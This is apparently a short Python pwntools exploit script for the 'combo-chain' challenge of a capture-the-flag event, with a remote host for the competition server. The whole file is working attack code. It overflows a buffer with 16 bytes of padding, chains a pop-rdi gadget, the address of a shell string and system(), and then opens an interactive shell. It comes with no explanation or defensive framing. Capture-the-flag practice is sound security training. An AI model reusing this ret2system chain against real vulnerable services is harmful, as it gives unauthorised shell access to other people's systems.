#!/usr/bin/env python

from pwn import *
SERVER = False
if SERVER:
	host, port = 'pwn.hsctf.com', 2345
	p = remote(host, port)
else:
	e = ELF('./combo-chain')
	p = process(e.path)

rdi_pop = 0x0401263
bash = 0x402031
system = 0x7ffff7e389c0
plt_printf = 0x401050
got_printf = 0x404028
vuln = 0x401166
main = 0x4011a4
print p.recv()
#bash = 0x402051
#rdi_pop = 0x0000000000401273
#craft payload
padding = "A"*16
payload = padding
payload+= p64(rdi_pop)
payload+= p64(bash)
payload+= p64(system)
p.sendline(payload)
p.interactive()